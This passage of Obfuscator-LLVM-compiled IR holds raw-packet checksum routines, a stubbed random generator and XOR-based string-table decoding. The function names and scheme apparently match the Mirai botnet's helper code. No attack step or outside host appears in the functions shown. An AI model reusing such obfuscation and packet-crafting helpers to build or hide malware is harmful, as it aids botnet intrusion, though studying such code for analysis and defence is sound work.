  %.015.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %19, %middle.block ]
  %.01114.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.01213.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end21, %middle.block ]
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader28, %.lr.ph
  %.015 = phi i64 [ %23, %.lr.ph ], [ %.015.ph, %.lr.ph.preheader28 ]
  %.01114 = phi i32 [ %24, %.lr.ph ], [ %.01114.ph, %.lr.ph.preheader28 ]
  %.01213 = phi i16* [ %20, %.lr.ph ], [ %.01213.ph, %.lr.ph.preheader28 ]
  %20 = getelementptr inbounds i16, i16* %.01213, i64 1
  %21 = load i16, i16* %.01213, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.015
  %24 = add i32 %.01114, -2
  %25 = icmp ugt i32 %24, 1
  br i1 %25, label %.lr.ph, label %._crit_edge.loopexit.loopexit, !llvm.loop !4

._crit_edge.loopexit.loopexit:                    ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %._crit_edge.loopexit.loopexit, %middle.block
  %.lcssa = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %27 = icmp eq i32 %.011.lcssa, 1
  br i1 %27, label %28, label %33

; <label>:28:                                     ; preds = %._crit_edge
  %29 = load i16, i16* %.012.lcssa, align 2
  %30 = zext i16 %29 to i64
  %sext = shl i64 %30, 56
  %31 = ashr exact i64 %sext, 56
  %32 = add i64 %31, %.0.lcssa
  br label %33

; <label>:33:                                     ; preds = %28, %._crit_edge
  %.1 = phi i64 [ %32, %28 ], [ %.0.lcssa, %._crit_edge ]
  %34 = lshr i64 %.1, 16
  %35 = and i64 %.1, 65535
  %36 = add nuw nsw i64 %34, %35
  %37 = lshr i64 %36, 16
  %38 = add nuw nsw i64 %37, %36
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %39, -1
  ret i16 %40
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #8 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %addconv = add nuw i32 %18, 1
  %min.iters.check = icmp ult i32 %addconv, 8
  br i1 %min.iters.check, label %.lr.ph33.preheader53, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph33.preheader
  %19 = zext i32 %addconv to i64
  %20 = and i32 %addconv, 7
  %n.mod.vf = zext i32 %20 to i64
  %n.vec = sub nsw i64 %19, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %21 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %3, %21
  %ind.end45 = getelementptr i16, i16* %10, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph33.preheader53, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <4 x i32> [ %27, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi47 = phi <4 x i32> [ %28, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %10, i64 %index
  %22 = bitcast i16* %next.gep to <4 x i16>*
  %wide.load = load <4 x i16>, <4 x i16>* %22, align 2
  %23 = getelementptr i16, i16* %next.gep, i64 4
  %24 = bitcast i16* %23 to <4 x i16>*
  %wide.load49 = load <4 x i16>, <4 x i16>* %24, align 2
  %25 = zext <4 x i16> %wide.load to <4 x i32>
  %26 = zext <4 x i16> %wide.load49 to <4 x i32>
  %27 = add <4 x i32> %25, %vec.phi
  %28 = add <4 x i32> %26, %vec.phi47
  %index.next = add i64 %index, 8
  %29 = icmp eq i64 %index.next, %n.vec
  br i1 %29, label %middle.block, label %vector.body, !llvm.loop !6

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %28, %27
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx50 = add <4 x i32> %bin.rdx, %rdx.shuf
  %rdx.shuf51 = shufflevector <4 x i32> %bin.rdx50, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx52 = add <4 x i32> %bin.rdx50, %rdx.shuf51
  %30 = extractelement <4 x i32> %bin.rdx52, i32 0
  %cmp.n = icmp eq i32 %20, 0
  br i1 %cmp.n, label %._crit_edge34.loopexit, label %.lr.ph33.preheader53

.lr.ph33.preheader53:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph33.preheader
  %.031.ph = phi i32 [ %3, %min.iters.checked ], [ %3, %.lr.ph33.preheader ], [ %ind.end, %middle.block ]
  %.02630.ph = phi i32 [ 0, %min.iters.checked ], [ 0, %.lr.ph33.preheader ], [ %30, %middle.block ]
  %.02729.ph = phi i16* [ %10, %min.iters.checked ], [ %10, %.lr.ph33.preheader ], [ %ind.end45, %middle.block ]
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33.preheader53, %.lr.ph33
  %.031 = phi i32 [ %35, %.lr.ph33 ], [ %.031.ph, %.lr.ph33.preheader53 ]
  %.02630 = phi i32 [ %33, %.lr.ph33 ], [ %.02630.ph, %.lr.ph33.preheader53 ]
  %.02729 = phi i16* [ %34, %.lr.ph33 ], [ %.02729.ph, %.lr.ph33.preheader53 ]
  %31 = load i16, i16* %.02729, align 2
  %32 = zext i16 %31 to i32
  %33 = add i32 %32, %.02630
  %34 = getelementptr inbounds i16, i16* %.02729, i64 1
  %35 = add nsw i32 %.031, -2
  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %.lr.ph33, label %._crit_edge34.loopexit.loopexit, !llvm.loop !7

._crit_edge34.loopexit.loopexit:                  ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %._crit_edge34.loopexit.loopexit, %middle.block
  %.lcssa43 = phi i32 [ %30, %middle.block ], [ %33, %._crit_edge34.loopexit.loopexit ]
  %37 = sub i32 %11, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %38 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa43, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %37, %._crit_edge34.loopexit ]
  %39 = icmp eq i32 %.0.lcssa, 1
  br i1 %39, label %40, label %44

; <label>:40:                                     ; preds = %._crit_edge34
  %41 = load i8, i8* %38, align 1
  %42 = zext i8 %41 to i32
  %43 = add i32 %42, %.026.lcssa
  br label %44

; <label>:44:                                     ; preds = %40, %._crit_edge34
  %.1 = phi i32 [ %43, %40 ], [ %.026.lcssa, %._crit_edge34 ]
  %45 = lshr i32 %6, 16
  %46 = and i32 %6, 65535
  %47 = lshr i32 %8, 16
  %48 = and i32 %8, 65535
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i16
  %52 = tail call zeroext i16 @htons(i16 zeroext %51) #12
  %53 = zext i16 %52 to i32
  %54 = zext i16 %2 to i32
  %55 = add nuw nsw i32 %45, %54
  %56 = add nuw nsw i32 %55, %46
  %57 = add nuw nsw i32 %56, %47
  %58 = add nuw nsw i32 %57, %48
  %59 = add i32 %58, %.1
  %60 = add i32 %59, %53
  %61 = lshr i32 %60, 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %44
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32 [ %66, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %.228 = phi i32 [ %65, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = and i32 %.228, 65535
  %65 = add nuw nsw i32 %64, %63
  %66 = lshr i32 %65, 16
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %44
  %.2.lcssa = phi i32 [ %60, %44 ], [ %65, %._crit_edge.loopexit ]
  %68 = trunc i32 %.2.lcssa to i16
  %69 = xor i16 %68, -1
  ret i16 %69
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #9 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %12, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %11, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %7

; <label>:5:                                      ; preds = %.lr.ph
  %6 = bitcast i8* %.01011 to i32*
  store i32 0, i32* %6, align 4
  br label %.backedge

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp sgt i32 %.012, 1
  br i1 %8, label %9, label %.backedge.thread

; <label>:9:                                      ; preds = %7
  %10 = bitcast i8* %.01011 to i16*
  store i16 0, i16* %10, align 2
  br label %.backedge

.backedge:                                        ; preds = %9, %5
  %.sink14 = phi i64 [ 2, %9 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %9 ], [ -4, %5 ]
  %11 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %12 = add i32 %.012, %.sink
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %7
  store i8 0, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #10 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #10 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #10 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { nounwind }
attributes #12 = { nounwind readnone }
attributes #13 = { noreturn nounwind }
attributes #14 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = distinct !{!4, !5, !2, !3}
!5 = !{!"llvm.loop.unroll.runtime.disable"}
!6 = distinct !{!6, !2, !3}
!7 = distinct !{!7, !5, !2, !3}
